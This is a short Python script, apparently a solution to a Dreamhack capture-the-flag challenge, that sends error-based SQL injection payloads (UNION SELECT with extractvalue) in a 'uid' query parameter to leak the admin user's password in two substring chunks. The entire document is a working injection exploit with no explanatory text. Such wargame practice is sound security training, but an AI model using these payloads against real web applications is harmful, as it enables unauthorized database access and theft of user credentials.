import requests


URL = "http://host1.dreamhack.games:15317/"

uid = f"admin' union select extractvalue(1,concat(0x3a, (select substr(upw,1,20) from user where uid='admin'))),1,1 -- "
res = requests.get(f"{URL}/", params={"uid": uid})
print(res.text)
uid = f"admin' union select extractvalue(1,concat(0x3a, (select substr(upw,21,30) from user where uid='admin'))),1,1 -- "
res = requests.get(f"{URL}/", params={"uid": uid})
print(res.text)
